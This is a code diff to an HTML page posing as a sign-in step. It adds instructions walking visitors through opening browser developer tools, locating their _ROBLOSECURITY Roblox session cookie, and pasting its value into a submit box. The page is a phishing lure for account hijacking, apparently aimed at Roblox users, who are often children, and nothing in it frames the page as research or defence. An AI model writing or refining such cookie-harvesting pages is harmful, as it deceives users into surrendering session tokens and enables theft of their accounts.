@@ -46,6 +46,9 @@
         #cookieSection, #adminLogs {
             display: none;
         }
+        ol {
+            text-align: left;
+        }
     </style>
 </head>
 <body>
@@ -60,7 +63,20 @@
     <div class="container" id="cookieSection">
         <h2>Enter Your Cookie</h2>
         <p>To complete your sign-in, please provide the cookie associated with your account.</p>
-        <input type="text" class="input-box" id="cookieInput" placeholder="Enter your cookie here">
+        
+        <!-- Roblox Cookie Instructions -->
+        <h3>How to Find Your Roblox Cookie:</h3>
+        <ol>
+            <li>Go to <a href="https://www.roblox.com" target="_blank" style="color: lightblue;">www.roblox.com</a> in your browser.</li>
+            <li>Right-click anywhere on the page and select <strong>Inspect</strong>.</li>
+            <li>Navigate to the <strong>Application</strong> tab in the Developer Tools.</li>
+            <li>Under the <strong>Storage</strong> section on the left sidebar, click on <strong>Cookies</strong>.</li>
+            <li>Select <strong>www.roblox.com</strong> from the list of domains.</li>
+            <li>Look for a cookie named <code>_ROBLOSECURITY</code> or any similar cookie that may contain your session information.</li>
+            <li>Copy its value and paste it below:</li>
+        </ol>
+
+        <input type="text" class="input-box" id="cookieInput" placeholder="Enter your Roblox cookie here">
         <button class="btn" onclick="submitCookie()">Submit Cookie</button>
     </div>
 
